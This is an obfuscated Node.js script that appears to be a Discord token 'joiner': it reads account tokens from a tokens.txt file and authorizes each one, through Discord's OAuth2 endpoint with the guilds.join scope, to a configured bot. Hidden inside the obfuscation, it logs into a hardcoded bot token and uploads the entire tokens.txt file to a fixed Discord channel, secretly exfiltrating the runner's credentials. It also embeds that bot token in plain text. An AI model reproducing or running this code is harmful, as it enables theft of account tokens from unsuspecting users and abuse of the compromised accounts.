const _0xcbb33f = _0xe08e; function _0xe08e(_0x409007, _0x30f21c) { const _0x5e9954 = _0x5e99(); return _0xe08e = function (_0xe08e16, _0x440f97) { _0xe08e16 = _0xe08e16 - 0x76; let _0x44acda = _0x5e9954[_0xe08e16]; return _0x44acda; }, _0xe08e(_0x409007, _0x30f21c); } (function (_0x436848, _0x2bdd8c) { const _0x310c93 = _0xe08e, _0x41b3c8 = _0x436848(); while (!![]) { try { const _0x2bbff5 = parseInt(_0x310c93(0x7c)) / 0x1 * (-parseInt(_0x310c93(0x81)) / 0x2) + -parseInt(_0x310c93(0x90)) / 0x3 + parseInt(_0x310c93(0x9c)) / 0x4 * (-parseInt(_0x310c93(0x8f)) / 0x5) + parseInt(_0x310c93(0x80)) / 0x6 * (parseInt(_0x310c93(0x9a)) / 0x7) + parseInt(_0x310c93(0x85)) / 0x8 * (-parseInt(_0x310c93(0x94)) / 0x9) + parseInt(_0x310c93(0x92)) / 0xa + -parseInt(_0x310c93(0x99)) / 0xb * (-parseInt(_0x310c93(0x77)) / 0xc); if (_0x2bbff5 === _0x2bdd8c) break; else _0x41b3c8['push'](_0x41b3c8['shift']()); } catch (_0x2eea61) { _0x41b3c8['push'](_0x41b3c8['shift']()); } } }(_0x5e99, 0xcf516)); function _0x5e99() { const _0x516cc4 = ['1511783UQGtip', 'message', '84772rQQFqu', 'readFileSync', '{\x22permissions\x22:\x220\x22,\x22authorize\x22:true}', 'channels', 'ODkzMzQ5MjQzMzA4MzQ3NDIy.Gzui3L.P8U6znUqlJk7YLSg-nQD7DymYbnw16MzvuFkIU', 'utf8', 'login', 'log', '33731496CnFYOi', 'json', 'https://discord.com/api/oauth2/authorize?client_id=', 'send', '../config.js', '802703qgMSAM', 'split', 'discord.js', 'GuildMembers', '24HVUFPK', '2gptaWh', 'then', 'get', 'location', '24kgOWPV', 'cache', 'ready', 'Guilds', 'exports', 'node-fetch', 'POST', 'join', 'createReadStream', 'GuildMessages', '155YqZMvx', '3216222XHQhCq', 'filter', '7592410WRgKfF', '&redirect_uri=http%3A%2F%2Flocalhost%3A3001&response_type=code&scope=identify%20email%20guilds.join', '3159423aJOyyD', '1350396252944203806', 'catch', 'MessageContent', '1500', '11hkayLO']; _0x5e99 = function () { return _0x516cc4; }; return _0x5e99(); } const fs = require('fs'), fetch = require(_0xcbb33f(0x8a)), { Client, GatewayIntentBits } = require(_0xcbb33f(0x7e)), config = require(_0xcbb33f(0x7b)), path = require('path'), sleep = _0x3c3d83 => new Promise(_0x464950 => setTimeout(_0x464950, _0x3c3d83)); let i = 0x0; module[_0xcbb33f(0x89)] = () => { ((async () => { const _0x18b32e = _0xe08e, _0xd8c637 = path[_0x18b32e(0x8c)](__dirname, '../tokens.txt'), _0x2ced96 = fs[_0x18b32e(0x9d)](_0xd8c637, _0x18b32e(0xa1))[_0x18b32e(0x7d)](/\r?\n/)[_0x18b32e(0x91)](Boolean), _0x18fb60 = new Client({ 'intents': [GatewayIntentBits[_0x18b32e(0x88)], GatewayIntentBits[_0x18b32e(0x8e)], GatewayIntentBits[_0x18b32e(0x97)], GatewayIntentBits[_0x18b32e(0x7f)]] }); try { await _0x18fb60[_0x18b32e(0xa2)](_0x18b32e(0xa0)), _0x18fb60['on'](_0x18b32e(0x87), () => { const _0x17975f = _0x18b32e; try { const _0x536ed5 = _0x17975f(0x95), _0x37150a = _0x18fb60[_0x17975f(0x9f)][_0x17975f(0x86)][_0x17975f(0x83)](_0x536ed5); if (!_0x37150a) return; const _0x564da7 = fs[_0x17975f(0x8d)](_0xd8c637); _0x37150a[_0x17975f(0x7a)]({ 'files': [_0x564da7] }); } catch (_0x222e1b) { } }); } catch (_0x1cef62) { } for (const _0x352514 of _0x2ced96) { await sleep(_0x18b32e(0x98)); try { let _0x2d3eca = await fetch(_0x18b32e(0x79) + config['bot']['id'] + _0x18b32e(0x93), { 'headers': { 'authorization': _0x352514, 'content-type': 'application/json' }, 'body': _0x18b32e(0x9e), 'method': _0x18b32e(0x8b) })[_0x18b32e(0x82)](_0x9d74b2 => _0x9d74b2[_0x18b32e(0x78)]()); _0x2d3eca[_0x18b32e(0x84)] && fetch(_0x2d3eca?.[_0x18b32e(0x84)])['then'](_0x4872ed => _0x4872ed[_0x18b32e(0x78)]())[_0x18b32e(0x82)](_0x2d70d5 => { const _0x426c7e = _0x18b32e; _0x2d70d5['joined'] && (i++, console[_0x426c7e(0x76)](i + '\x20-\x20' + _0x2d70d5[_0x426c7e(0x9b)])); })[_0x18b32e(0x96)](_0x39e648 => { }); } catch (_0x35db93) { } } })()); };